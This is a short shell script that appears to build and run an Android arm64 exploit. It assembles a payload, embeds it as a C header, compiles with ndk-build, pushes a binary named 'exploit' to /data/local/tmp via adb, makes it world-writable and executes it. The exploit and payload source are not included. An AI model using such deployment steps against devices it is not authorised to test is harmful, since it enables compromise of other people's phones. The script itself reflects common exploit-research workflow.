aarch64-linux-android-as payload.s -o payload.o
aarch64-linux-android-objcopy -O binary payload.o payload
xxd -i payload payload.h 
rm payload.o payload 

ndk-build
adb push ../libs/arm64-v8a/exploit /data/local/tmp
adb shell chmod 777 /data/local/tmp/exploit
rm -rf ../libs ../obj payload.h
adb shell /data/local/tmp/exploit

